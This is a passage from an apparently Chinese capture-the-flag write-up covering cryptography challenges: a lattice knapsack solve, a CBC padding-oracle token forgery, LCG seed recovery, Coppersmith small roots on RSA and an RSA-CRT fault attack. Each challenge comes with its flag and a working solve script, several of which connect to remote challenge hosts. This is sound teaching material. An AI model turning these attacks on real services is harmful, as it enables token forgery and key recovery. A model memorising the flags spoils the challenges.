class="hljs-number">2940859266396484177046950297747035075581528261421780144745510868833940947436892884317945413009062195131282427353421843599435540870608533427082310371991448263668943446467012234235423224621306853322420530273310915514911199241940074056679489070615132714475376051992021926359767040433525538015681448999840130475</span>, <span class="hljs-number">548689545843352644706594817791916798935926169039949612045704475450748409508729185770761119838346781323621349389866236071081561399243404244714155141544648303063456319671299105257578289200256770470822584813536793412849716239639576718489840572112594326558415000296522178057568395086038325307977947444439726584</span>, <span class="hljs-number">3010616597194407843357011493768226311996779936020447680599396464433460244108289976495251354016971038921869723910916425767809708375534965449476533249836556148335824247603906528120471710941952696238835058653112630048672417388478352533277197269216843020568574350081644829259392323542558433211992623068567120587</span>, <span class="hljs-number">3019610623803670378150124109614457084136511463729400511468609742772703183421166088411788964693121054269684582033658538394387863801162935821173514211807416494847871639762883380956354585377141554057874693736782729284083109897025508501001221985388313011492622269308786778580954670467179237628723090772412112687</span>, <span class="hljs-number">3456892442153552825791351304104038574252790018688305404396377268819034645016022883066037914406379312585085969337036297593280070525728988705071614150752282245087432221796807382606733043785366663725628656854586223132978587170262523695339706648106798869652892275586447545122997251305483029423828330531593932862</span>, <span class="hljs-number">4193891264904205018508618416339352584671260177729807127300165581839925946177491654233681148389862986208122337311124542705343864452023225716889672253282837418417646614418628273445540560433330622877660601426976113551605853446006242952272663778843228585973128206825550195233913898539423600913183064577758873954</span>, <span class="hljs-number">2407092271751215972048043502815295352185546773516241547540131954393962881442406976192613695984710550047628104337671095096288562398963165175105174901769543681359221819469770919839838034620523681406907215858941019567615124144428620683169845150440718190806822128120550572037141734104550025816428879998161395163</span>, <span class="hljs-number">3039493550476778425543542809825749448025108635588378036955529285869960376586265197580300638984618329364749574427197025664340773190456890302653237300995205210799037105036662753909779737156938953274043780496298673796696943846964629986874922271810638448197816494264041708372669503914550421974946711031289926293</span>, <span class="hljs-number">272563939471171309959170153771634996960936135673271731788733495960344692381136945916942568786049312198257035504896323528724744795123861461584401188470438047784934122550029580208910854508579650208127645345281522103783955179458770893145740414884316390448589757892358377113946038280675011779670094858931334018</span>, <span class="hljs-number">1009306484453568367351135445283864445421400747416927875348113619041434905426995057429763003999714625833944790065110156236193433762496836449027911533918382496052921841906644845603304588558649147151365076560589315834895132427621448910997659366530383783672825207059749403704480478042078106649057810914947266177</span>, <span class="hljs-number">4542975725090092875265329818979113790789178531933797517500545146337069005944558101117748676928230913679806069499848090463410223317919708121280722248012871211479222012707693102896914646070681515255920654353954343673955865638894951048393803518037317279313188453889045850947444535024231435650445288167810547649</span>, <span class="hljs-number">454118457391449435805631087371879215687391516501736464944676591913727047323329789900878071826255762280125257514313836387097309893330938135058174163129007190618818722762276953753837663484704199446178647155456216547359467532221735289180135930858545044454711881070673869462577101957394519297680545708551682871</span>, <span class="hljs-number">1635702691731010191983942236732369682553721178949755326872380020576168419895627594750721768640028730725526766600288974800547044582100453085620162260228694559885129457259603249847460965670797863491108618898897657515386424594055752464965242098978185854850317501460275816296862145418447280844274646388414104618</span>, <span class="hljs-number">856474611501935545316620871366412156617051368883411272795003885724971371892129175681512202481819339179865345222683752128830134710440850381281509369656455971140851363726552596227501338928036581146133807719813913358706419049503859123205772834913280680673875610113990715806519852833617669284820587525172592303</span>, <span class="hljs-number">1184851695633196590859530896073053906108307787616752524429376482465869626210628976885827250056034383829298058194689386758516503610156407878349969493521298971808429815854303741756018364323387421074696755820552095597773436027425294236122929051268931281237544341614342480229020965356208060914322588066116834577</span>, <span class="hljs-number">436490649559079673833595532254393109895694521002624466739396689971968069439741668235067091621773920055394757920676172586718759162562223154846243292882123252749573459069094485250559254395147119777548007310781860371866041369226942788307752426438209927604209419711564771259072744340537465392020452342580959696</span>, <span class="hljs-number">4388537304133772715863925316641169075310249482820183896348626469192505828920208159671411483068230837953341786867798126172090049058711846929085459995896179765106731427761260844243991010221357209110209314936043522650394328902532384864309990120987592122633321068101325301231904078972595722775277294596713340213</span>, <span class="hljs-number">2393101447609058423972930395701691663427846813221239320934606678459413504768644926181460017799519382449397718313025961069893544988479646385919424405779326117178588032903929941862027150270119711598802163480952922120187094718686898939410748317800523138265797423665663221828132875519135258017417196723394991589</span>, <span class="hljs-number">2076619377477031848639856175879543470343734230329455509726069209675934720306012788659428906143908031714533138217029168088704862709255685909509412415865310492415529179862803114166904885039563512848807162958978688888862433736068791165778446148630009314317367780254227290580067976686185051291022979661750915754</span>, <span class="hljs-number">3491077294883860264163831470480731798100952316266751074114141651012550304283058960434530180849262526809044918444772385895477880956597558643610336430554267189540135235980259742427410947649578494040773591269499992232386779146605217149697181339334540183232972164203652901657790093101500810462049416615463177546</span>, <span class="hljs-number">1900282698989463723132580002213591610224600569598698293743548176893816262621986651465369623867470701906655323671861637049755140533957531464521427859781669543880016267139703210772613428562790216713087985891753909255158869760207735542707780506499364324239566426940858870670235658504146842251118347853718573687</span>, <span class="hljs-number">845835496189376653886150062538136220529949512316837843552683019639478239138823063495130985204374692468338372257263301271462502177444656561614715214184613422656425547782261460936839766389042333921944045616045486642969616735714861351814153114962802762127416684363023821783147694935652388700962068809263643389</span>, <span class="hljs-number">1692948566193147198415868174132947385960361457234775960996688163030768614452245060590761872803325778389788629611003585774682395160900493537852600395064146263629935684962163363737792411465123735249475890890275593935918443912139384104086401671117297441852839961645132964273067219203682142732326663844844075005</span>, <span class="hljs-number">3901970947731392475716050740298719400950276818247119306832129595796167756242376176561993909746155516755870152152426215315380852798393154894808746740712267603715980983656834079622454549206763317947354722296743984624987127611181689458009296361053627284630345662893605480665829929447703677978777309463029378417</span>, <span class="hljs-number">1577043788886187395642609069164097976028680286900550453860267666151053881614552629192152797547831199391087342194362363394388982584111597031153132134424331287494091263926113657497887818333781008531372953107929672293402747435497312779887642688714378020998413789750803772540267677934581148808295413525216136803</span>, <span class="hljs-number">3276002168563401469280187929611647305197543429976350427130738049281707438362184511160108432124838733957215323976050672988158715407342981430458842450708646678151269772750534404161450465011318453684449149908734823528246992684797781800055195681433678035768369610420102397884004628356347672352589330168248485654</span>, <span class="hljs-number">4411009177016980725472022463786638290635658962658405430390446282357905517369354153749556317880287891619728551571365291772228008250807956164974455402362384308494347027623477843175153409603882541941337758836671784172488496488754902131790649458047942214547960790875638234105693707598046416061433722602277417913</span>, <span class="hljs-number">726307210260821049373144992154409948345637635368877092819523015622922973757990798665952122937220928090928915580354873566840841334710321751558673510023725557920994744241558993161607005593746962259280610204185140150932218256262971149625050424081864893903080125492194257806289021889420725960087352176605476401</span>, <span class="hljs-number">3693547596900043741100931793124522047704999510924569121382660670034074764908100421156413899466991914742739196108134269694588165114035371129093570934464583558551757548295216503767696894203692851680949073578461575940202069273789808433835247367833648763742770751275454183762387380512531453133282161136891481929</span>, <span class="hljs-number">3665167482952187096160406260284763362510646804687123748116392784543398398279641171604017029973718130518368590622397871178112956392132585354286995099639634346724159039575980422514838700663255651434551797666622249188660622202211877423560216079734584070335703175927475594016858689649422345026726688518192776409</span>, <span class="hljs-number">3177225879939950395651618993805008222412532118788273586156368076266815187233402783969056213942565660008399569335649908751056924645159655412260822319346140671522760303386912674853426818989655804583118735050488807630342254022038941207363968463486349805992873818522316215108897954229670433933723727953745569923</span>, <span class="hljs-number">3779028950209214447433161167866672177270317911040016153565684362868472897920954128667548298875972509713229980453212868866709806350382879548859304441713862617068673359830166023396799623627580164606085346085586198750311774006643094309383771953620689844976832117988296867004302713999531851905939505561391164191</span>, <span class="hljs-number">1565404281114657156315837816758658026233033173060800317005770893567963194302658801484623389662992305672382398023818850068525864828775625430086172113834590761904637783666223747194948578977291563029119331359772126904299450508763826664055472843841614023374884939978267540166731011979458675326635019791695565262</span>, <span class="hljs-number">4590612706732938257980684733418322154816988549292312878809124257236458054000997655804894335759227339962003988227969894859099164186023473343838474896521750585481368380309987345243249527717514650369578965067712448623509794751079446662740247787522802157146979933561737569581462646401210202611137277719776325874</span>, <span class="hljs-number">4656134044766857450597560240558144676752410910811435167749159091161696894834586087615774989757513667092954856468407760017560542136316715670693777783679558119131401055537286285519362471310101802489073198581136126447904865719977268401545732467435790881584291255625228947956711968019016045126232778925003004330</span>, <span class="hljs-number">1302442060464287844140958699896819274375020008729351597230040891362445067421212462957400958722642791768192657008363675587123266689147607759102472970553121277399742938912421426476562987172511600083704255430238284187551952036180307899091818953207131942020689197031040878798574298241042445489355623641304509901</span>, <span class="hljs-number">1713371877870224703630049314762946474778920435955283834739126207078713464668904026594605513305271384038631655087342898588084451349187868588684801874090865404001866704899244865655209470792718001015037577763825373010785137282706266173729073167176023660411002299453317075113416538613782092969312114363570614517</span>, <span class="hljs-number">3637726819689145119298859324222689829348828654379242284522514186534374907105449951789577704447855700484656693611649650849292507621631154875853657102526884725384668206346033815730075251973202378946655675542205955142413874296868545263385884125877782563979657700695334466662362949444188725774579230310152088275</span>, <span class="hljs-number">2158102278530231087495034471822326358570676636562730292269287971780457035415439398154664393611400939934545917849558224030371421867959640393291189526256769127344213191071939008079603466136176333380110183758543653357694387470236768742232731622566892872043474084829437398364701172310088532750048770269284101440</span>, <span class="hljs-number">1357917511517266002753494995174534483863311462321496912444365910532975757440009039109426669425460450718165016869719113431933081156266889995971449973598815991564815927350509938427923107101552779751422733194897338044578854890945368216930911437462116835554456903232462472222161348181958293840928247406557674974</span>, <span class="hljs-number">2251018060294798208546405609149289070988382731157357021632370786567727415247731970083169483820553902016645411129588563627592996984294288337792592520936877108974148008787194317828561698272728745048340731096531990558473233518197391710380846601332446583691529730716812953431975867169637715185113349221752268933</span>, <span class="hljs-number">1482068954689822886842025936245442918811660979248644510861339518658861807617708511787281929243096751044401436667087259365497421213702452919894081994558259251364044857153958318631770890533563020667069772553910132699365629867005612637922185970987117180360664807199834536264073950978308314028235946030457178450</span>]</div><div line="NkLS" data-language="python" class="ql-code-block"><br></div><div line="vhFU" data-language="python" class="ql-code-block">n = <span class="hljs-built_in">len</span>(k)</div><div line="YBA6" data-language="python" class="ql-code-block">L = matrix.zero(n + <span class="hljs-number">1</span>)</div><div line="DUTH" data-language="python" class="ql-code-block"><span class="hljs-keyword">for</span> row, x <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(k):</div><div line="W51K" data-language="python" class="ql-code-block">    L[row, row] = <span class="hljs-number">2</span></div><div line="dzE3" data-language="python" class="ql-code-block">    L[row, -<span class="hljs-number">1</span>] = x</div><div line="6qu0" data-language="python" class="ql-code-block">L[-<span class="hljs-number">1</span>, :] = <span class="hljs-number">1</span></div><div line="zNxf" data-language="python" class="ql-code-block">L[-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>] = c</div><div line="pbEu" data-language="python" class="ql-code-block"><span class="hljs-built_in">print</span>(L.LLL())</div><div line="Rd4O" data-language="python" class="ql-code-block">data = <span class="hljs-string">"""</span></div><div line="Xm0z" data-language="python" class="ql-code-block"><span class="hljs-string">-1   -1    1    1   -1   -1    1    1   -1   -1    1   -1   -1    1    1    1   -1   -1    1    1    1    1   -1    1   -1   -1    1    1   -1   -1   -1    1   -1   -1   -1   -1</span></div><div line="qNMs" data-language="python" class="ql-code-block"><span class="hljs-string">    1   -1   -1    1   -1    1    1   -1   -1    1    1    1   -1   -1    1    1    1    1   -1    1   -1   -1   -1    1   -1    1    1    1   -1   -1   -1    1   -1    1    1    1</span></div><div line="VDHG" data-language="python" class="ql-code-block"><span class="hljs-string">   -1   -1    1   -1    1    1   -1    1   -1   -1    1    1    1   -1   -1    1   -1   -1    1    1   -1    1   -1    1   -1    1   -1   -1   -1   -1   -1    1   -1   -1   -1    1</span></div><div line="IHnJ" data-language="python" class="ql-code-block"><span class="hljs-string">    1   -1    1    1   -1   -1    1    1   -1    1   -1    1   -1   -1    1    1   -1    1    1    1   -1   -1   -1    1   -1    1   -1    1   -1   -1    1    1    1   -1   -1    1</span></div><div line="wrYR" data-language="python" class="ql-code-block"><span class="hljs-string">   -1   -1   -1    1   -1    1    1    1   -1   -1    1   -1    1    1   -1    1   -1   -1    1   -1   -1   -1   -1    1   -1   -1    1   -1   -1   -1    1    1    1   -1    1    1</span></div><div line="pWnF" data-language="python" class="ql-code-block"><span class="hljs-string">    1   -1   -1    1   -1   -1    1    1    1   -1   -1    1    1   -1   -1    1    1   -1   -1    1    1   -1   -1    1   -1   -1    1    1    1   -1   -1    1   -1   -1    1    1</span></div><div line="JPFK" data-language="python" class="ql-code-block"><span class="hljs-string">    1   -1   -1    1    1   -1    1    1    1   -1   -1    1   -1    1   -1    1    1   -1   -1    1   -1    1    1    1    1   -1   -1    1    1    1   -1    1   -1   -1   -1   -1   -1    1   -1    0</span></div><div line="BRvK" data-language="python" class="ql-code-block"><span class="hljs-string">"""</span>.strip(<span class="hljs-string">'\n'</span>).split(<span class="hljs-string">" "</span>)</div><div line="zskT" data-language="python" class="ql-code-block">flag = []</div><div line="Gpg0" data-language="python" class="ql-code-block"><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> data:</div><div line="PADC" data-language="python" class="ql-code-block">    <span class="hljs-keyword">if</span> t == <span class="hljs-string">""</span>:</div><div line="vRVx" data-language="python" class="ql-code-block">        <span class="hljs-keyword">continue</span></div><div line="xCQr" data-language="python" class="ql-code-block">    <span class="hljs-keyword">if</span> t == <span class="hljs-string">"-1"</span>:</div><div line="wnH3" data-language="python" class="ql-code-block">        flag.append(<span class="hljs-string">'1'</span>)</div><div line="3JC3" data-language="python" class="ql-code-block">    <span class="hljs-keyword">else</span>:</div><div line="BdnF" data-language="python" class="ql-code-block">        flag.append(<span class="hljs-string">'0'</span>)</div><div line="GWhZ" data-language="python" class="ql-code-block">flag = <span class="hljs-string">""</span>.join(flag)[:-<span class="hljs-number">1</span>]</div><div line="bHyD" data-language="python" class="ql-code-block"><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(flag,<span class="hljs-number">2</span>)))</div></div><p ql-global="true" line="GqGX"><br></p><h1><div ql-global="true" line="NR0S" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>Door</div></h1><ul data-list-style="circle"><li ql-global="true" line="gmkr" class="bullet-item"><strong>考点</strong>: CBC字节翻转攻击</li></ul><ul data-list-style="circle"><li ql-global="true" line="85I8" style="line-height: 2.0;" linespacing="115" class="bullet-item"><strong>FLAG</strong>：<span class="ql-font-microsoftyahei ql-size-12">flag{d0_n0t_3xpose_th3_padd1ng_5tatus}</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="dvr1" class="bullet-item"><strong>解题步骤 </strong></li></ul><p ql-global="true" line="tnJF">服务端会把密文解密之后的填充状态返回， 那么我们只要控制iv， 使得解密之后的明文产生"...\x01", "...\x02\x02" ...的状态，获得明文为"\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10"对应的IV， 然后利用xor把我们想要输入的内容合并到这个IV里面。</p><p ql-global="true" line="Dbrt"><br></p><div class="ql-code-block-container" data-language="python" spellcheck="false"><div line="fsnD" data-language="python" class="ql-code-block"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</div><div line="ePZp" data-language="python" class="ql-code-block"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES</div><div line="0leE" data-language="python" class="ql-code-block"><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad</div><div line="Gycm" data-language="python" class="ql-code-block"><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> urandom</div><div line="MEMT" data-language="python" class="ql-code-block"><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm</div><div line="fmQT" data-language="python" class="ql-code-block"><br></div><div line="i6xI" data-language="python" class="ql-code-block">HOST = <span class="hljs-string">"node4.buuoj.cn"</span></div><div line="9LA6" data-language="python" class="ql-code-block">PORT = <span class="hljs-number">26780</span></div><div line="PAj5" data-language="python" class="ql-code-block">r = remote(HOST, PORT)</div><div line="E2t0" data-language="python" class="ql-code-block"><br></div><div line="62nb" data-language="python" class="ql-code-block">auth_code = urandom(<span class="hljs-number">16</span>)</div><div line="HYtX" data-language="python" class="ql-code-block">token = urandom(<span class="hljs-number">16</span>)</div><div line="U8lU" data-language="python" class="ql-code-block"><br></div><div line="Edks" data-language="python" class="ql-code-block">diff = [<span class="hljs-number">0</span>] * <span class="hljs-number">16</span></div><div line="Y63q" data-language="python" class="ql-code-block"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)):</div><div line="iJib" data-language="python" class="ql-code-block">    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>)):</div><div line="vFjM" data-language="python" class="ql-code-block">        diff[i] = b</div><div line="Eghe" data-language="python" class="ql-code-block">        tmp_tk = xor(token, <span class="hljs-built_in">bytes</span>(diff))</div><div line="W8Gh" data-language="python" class="ql-code-block"><br></div><div line="0Bzn" data-language="python" class="ql-code-block">        r.sendlineafter(<span class="hljs-string">b'&gt; '</span>, <span class="hljs-string">b'1'</span>)</div><div line="Nk4P" data-language="python" class="ql-code-block">        r.sendlineafter(<span class="hljs-string">b'&gt; '</span>, tmp_tk.<span class="hljs-built_in">hex</span>().encode())</div><div line="ZDj2" data-language="python" class="ql-code-block">        r.sendlineafter(<span class="hljs-string">b'&gt; '</span>, auth_code.<span class="hljs-built_in">hex</span>().encode())</div><div line="F4bS" data-language="python" class="ql-code-block">        res = r.recvline()</div><div line="IAid" data-language="python" class="ql-code-block">        <span class="hljs-keyword">if</span> <span class="hljs-string">b'out'</span> <span class="hljs-keyword">in</span> res:</div><div line="CnmZ" data-language="python" class="ql-code-block">            <span class="hljs-keyword">if</span> i != <span class="hljs-number">0</span>:</div><div line="zoiJ" data-language="python" class="ql-code-block">                <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i, <span class="hljs-number">16</span>):</div><div line="jfYg" data-language="python" class="ql-code-block">                    diff[j] ^= (<span class="hljs-number">16</span> - i) ^ (<span class="hljs-number">16</span> - i + <span class="hljs-number">1</span>)</div><div line="ILyV" data-language="python" class="ql-code-block">            <span class="hljs-keyword">break</span></div><div line="BhgF" data-language="python" class="ql-code-block"><br></div><div line="sCUa" data-language="python" class="ql-code-block">forged_token = xor(token, <span class="hljs-built_in">bytes</span>(diff))</div><div line="0OrJ" data-language="python" class="ql-code-block">forged_token = xor(forged_token, <span class="hljs-string">b'\x10'</span> * <span class="hljs-number">16</span>)</div><div line="djsS" data-language="python" class="ql-code-block">forged_token = xor(forged_token, pad(<span class="hljs-string">b'SoNP#1033'</span>, <span class="hljs-number">16</span>))</div><div line="Haa8" data-language="python" class="ql-code-block"><br></div><div line="K4KA" data-language="python" class="ql-code-block">r.sendlineafter(<span class="hljs-string">b'&gt; '</span>, <span class="hljs-string">b'1'</span>)</div><div line="L6Rj" data-language="python" class="ql-code-block">r.sendlineafter(<span class="hljs-string">b'&gt; '</span>, forged_token.<span class="hljs-built_in">hex</span>().encode())</div><div line="gRdf" data-language="python" class="ql-code-block">r.sendlineafter(<span class="hljs-string">b'&gt; '</span>, auth_code.<span class="hljs-built_in">hex</span>().encode())</div><div line="zUYm" data-language="python" class="ql-code-block"><br></div><div line="vM9U" data-language="python" class="ql-code-block">r.interactive()</div></div><p ql-global="true" line="ljNe" style="line-height: 2.0;" linespacing="115"><br></p><h1><div ql-global="true" line="crO7" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>babyrandom</div></h1><ul data-list-style="circle"><li ql-global="true" line="ABJX" class="bullet-item"><strong>考点</strong>: LCG 参数恢复</li></ul><ul data-list-style="circle"><li ql-global="true" line="X0MJ" style="line-height: 2.0;" linespacing="115" class="bullet-item"><strong>FLAG</strong>：<span class="ql-font-microsoftyahei ql-size-12">flag{lcg_1s_n0t_s3cur3#fb528ba5}</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="CF7f" class="bullet-item"><strong>解题步骤 </strong></li></ul><p ql-global="true" line="CWE0">LCG的状态更新函数为xj = axi + b, 我们利用三组连续的随机数值恢复a, b 然后倒推恢复seed获得flag</p><p ql-global="true" line="TIop"><br></p><div class="ql-code-block-container" data-language="python" spellcheck="false"><div line="GrHa" data-language="python" class="ql-code-block"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</div><div line="hH23" data-language="python" class="ql-code-block"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *</div><div line="3GWK" data-language="python" class="ql-code-block">p = <span class="hljs-number">64999433139797068147576269731948390094958654326970231465808792590598519729077</span></div><div line="IbZ3" data-language="python" class="ql-code-block"><br></div><div line="2Oyf" data-language="python" class="ql-code-block">r = remote(<span class="hljs-string">'node4.buuoj.cn'</span>, <span class="hljs-number">26868</span>)</div><div line="JfTO" data-language="python" class="ql-code-block"><br></div><div line="6wKZ" data-language="python" class="ql-code-block">r.sendlineafter(<span class="hljs-string">b'&gt; '</span>, <span class="hljs-string">b'1'</span>)</div><div line="V1iJ" data-language="python" class="ql-code-block"><br></div><div line="hHOO" data-language="python" class="ql-code-block">x = []</div><div line="fs59" data-language="python" class="ql-code-block"><br></div><div line="Ntof" data-language="python" class="ql-code-block"><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):</div><div line="usGS" data-language="python" class="ql-code-block">    r.sendlineafter(<span class="hljs-string">b'&gt; '</span>, <span class="hljs-string">b'2'</span>)</div><div line="lQEt" data-language="python" class="ql-code-block">    x.append(<span class="hljs-built_in">int</span>(r.recvline().strip().decode()))</div><div line="yqVj" data-language="python" class="ql-code-block"><br></div><div line="y7LK" data-language="python" class="ql-code-block">a = (x[<span class="hljs-number">2</span>]-x[<span class="hljs-number">1</span>]) * inverse(x[<span class="hljs-number">1</span>]-x[<span class="hljs-number">0</span>], p) % p</div><div line="TNcM" data-language="python" class="ql-code-block"><br></div><div line="KwPv" data-language="python" class="ql-code-block">b = (x[<span class="hljs-number">1</span>] - a * x[<span class="hljs-number">0</span>]) % p</div><div line="93nK" data-language="python" class="ql-code-block"><br></div><div line="qdDt" data-language="python" class="ql-code-block">flag = ((x[<span class="hljs-number">0</span>] - b) * inverse(a, p)) % p</div><div line="Duwh" data-language="python" class="ql-code-block"><br></div><div line="qM7v" data-language="python" class="ql-code-block"><span class="hljs-built_in">print</span>(long_to_bytes(flag))</div><div line="gK1Z" data-language="python" class="ql-code-block"><br></div></div><p ql-global="true" line="aAAa" style="line-height: 2.0;" linespacing="115"><br></p><h1><div ql-global="true" line="tbtK" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>小明的密码题</div></h1><ul data-list-style="circle"><li ql-global="true" line="Ddme" class="bullet-item"><strong>考点</strong>: RSA已知明文高位, Coppersmith算法</li></ul><ul data-list-style="circle"><li ql-global="true" line="1s3y" class="bullet-item"><strong>FLAG</strong>：<span class="ql-font-microsoftyahei ql-size-12">flag{sm4ll_r00ts_is_brilliant#cc0dac72}</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="UkOr" class="bullet-item"><strong>解题步骤 </strong></li></ul><ul data-list-style="circle"><li ql-global="true" line="SGtN" class="bullet-item">由于最后缺失的部分bit长度很小并且加密的指数很小, 我们可以试着使用Coppersmith算法把未知的部分求出来</li></ul><p ql-global="true" line="kmIB"><br></p><div class="ql-code-block-container" data-language="python" spellcheck="false"><div line="Io4a" data-language="python" class="ql-code-block"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *</div><div line="xCPx" data-language="python" class="ql-code-block"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *</div><div line="ftCf" data-language="python" class="ql-code-block"><br></div><div line="9mOE" data-language="python" class="ql-code-block">n = <span class="hljs-number">131889193322687215946601811511407251196213571687093913054335139712633125177496800529685285401802802683116451016274353008428347997732857844896393358010946452397522017632024075459908859131965234835870443110233375074265933004741459359128684375786221535003839961829770182916778717973782408036072622166388614214899</span></div><div line="1Ndd" data-language="python" class="ql-code-block">c = <span class="hljs-number">11188201757361363141578235564807411583085091933389381887827791551369738717117549969067660372214366275040055647621817803877495473068767571465521881010707873686036336475554105314475193676388608812872218943728455841652208711802376453034141883236142677345880594246879967378770573385522326039206400578260353074379</span></div><div line="DUpF" data-language="python" class="ql-code-block">part = bytes_to_long(<span class="hljs-string">b'sm4ll_r00ts_is_brilliant#'</span>)</div><div line="RBPj" data-language="python" class="ql-code-block">F = Zmod(n)</div><div line="zx6k" data-language="python" class="ql-code-block"><br></div><div line="ouvW" data-language="python" class="ql-code-block">x = PolynomialRing(F, <span class="hljs-string">'x'</span>).gen()</div><div line="eCPG" data-language="python" class="ql-code-block"><br></div><div line="Is8x" data-language="python" class="ql-code-block">f = ((part &lt;&lt; <span class="hljs-number">64</span>) + x) ** <span class="hljs-number">5</span> - c</div><div line="aLrJ" data-language="python" class="ql-code-block"><br></div><div line="MSi6" data-language="python" class="ql-code-block">xx = f.small_roots(X = <span class="hljs-number">2</span> ** <span class="hljs-number">64</span>)[<span class="hljs-number">0</span>]</div><div line="Kyi3" data-language="python" class="ql-code-block"><br></div><div line="tVQT" data-language="python" class="ql-code-block">flag = (part &lt;&lt; <span class="hljs-number">64</span>) + xx</div><div line="EVGF" data-language="python" class="ql-code-block"><br></div><div line="CCZu" data-language="python" class="ql-code-block"><span class="hljs-built_in">print</span>(<span class="hljs-string">b'flag{'</span>+ long_to_bytes(<span class="hljs-built_in">int</span>(flag)) +<span class="hljs-string">b'}'</span>)</div></div><p ql-global="true" line="7GHV"><br></p><h1><div ql-global="true" line="Dru7" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>rsa_crt</div></h1><ul data-list-style="circle"><li ql-global="true" line="J7IM" class="bullet-item"><strong>考点</strong>: RSA-CRT fault attack</li></ul><ul data-list-style="circle"><li ql-global="true" line="62Vz" class="bullet-item"><strong>FLAG</strong>：<span class="ql-font-microsoftyahei ql-size-12">flag{b40ea076da8c73572ae5d067aa0fc22e}</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="pw1q" class="bullet-item"><strong>解题步骤 </strong></li></ul><p ql-global="true" line="xi85"><br></p><div class="ql-code-block-container" data-language="python" spellcheck="false"><div line="9e0b" data-language="python" class="ql-code-block"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *</div><div line="6Es4" data-language="python" class="ql-code-block"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> *</div><div line="Epd9" data-language="python" class="ql-code-block"><br></div><div line="5aYB" data-language="python" class="ql-code-block">m=<span class="hljs-number">2180240512138982889935733758776025289492848542072999905411903898302427496814336475436552230920326681809745778470583226987</span></div><div line="fkpO" data-language="python" class="ql-code-block">n=<span class="hljs-number">25505131259827344749407187081729819350996141100990518281765117676936124636084125400315049858697199427401342785804654120926568235761577895862889807660442415521870277729420875825744007886870384790308986342360349597392841568418588521694478184632631896474390291958350681472768485356865513284619086754437723630874827593280089682939629265210875169009057935264259019861755270570945614034505771690412042781423771110441028258110022746603974882162934979726300741541857444013708508946471384525030286343828680432038605288717842755346907256658746733811881247992925881684393431852248253701825024590345480994598867741811599162649467</span></div><div line="x12M" data-language="python" class="ql-code-block">S_=<span class="hljs-number">5510086561842250138908875342533294108331951659612671466695801343686972919443402163401521040457640602756777910081639191753436122171756174730531385913865951826869995984787102439679170684422717808771260217541439878677750508065703064081375473845405916674327932798153100574555933448570618732842365795738120491532398081467312017203933413296779070611024124965772787502242499016884537233028947865288037718074352448773759363242111080540630360902388540661831992776707600133253329779003707938065020121645530719140954554800986771763343191398210100325971573069812381693089384221441735278736889673500218274673196333806222266248844379127652366</span></div><div line="ftyq" data-language="python" class="ql-code-block">S=<span class="hljs-number">11422623501509574650959962952004985925543723972567988534433510888436662069119800576321679344425052011563473005275801787271861671898318523033415642388512047035650991047953319601346912194462122313366888126100093635969476696871403883687946617575837061694813669883782221006701704487938500886952347003631626326127154081787016692856628561200386941683756397734100698520464199249811238013146899352390453500132666840606585760306723894654933077094375810666168464835756607377998959675132305971721109661644231613426322675350973373434138686086023265910883509514575554429502214217460059521619625693750938117427832654792355808803321</span></div><div line="CoTU" data-language="python" class="ql-code-block">e = <span class="hljs-number">65537</span></div><div line="LZ37" data-language="python" class="ql-code-block"><br></div><div line="8bfn" data-language="python" class="ql-code-block">p = GCD(<span class="hljs-built_in">pow</span>(S_, e, n) - m, n)</div><div line="uwkr" data-language="python" class="ql-code-block">q = n // p</div><div line="dmgZ" data-language="python" class="ql-code-block"><br></div><div line="bIFW" data-language="python" class="ql-code-block"><span class="hljs-built_in">print</span>(<span class="hljs-string">'flag{'</span> + md5(<span class="hljs-built_in">str</span>(p).encode()).hexdigest() + <span class="hljs-string">'}'</span>)</div><div line="7Faz" data-language="python" class="ql-code-block"><span class="hljs-built_in">print</span>(<span class="hljs-string">'flag{'</span> + md5(<span class="hljs-built_in">str</span>(q).encode()).hexdigest() + <span class="hljs-string">'}'</span>)</div></div><p ql-global="true" line="fXzC"><br></p><p ql-global="true" class="ql-align-center ql-heading-title" line="WPBQ" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>Reverse</p><h1><div ql-global="true" line="eveS" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>EzDLL</div></h1><ul data-list-style="circle"><li ql-global="true" line="bu7R" class="bullet-item"><strong>考点</strong>: TLS修改XTEA的key</li></ul><ul data-list-style="circle"><li 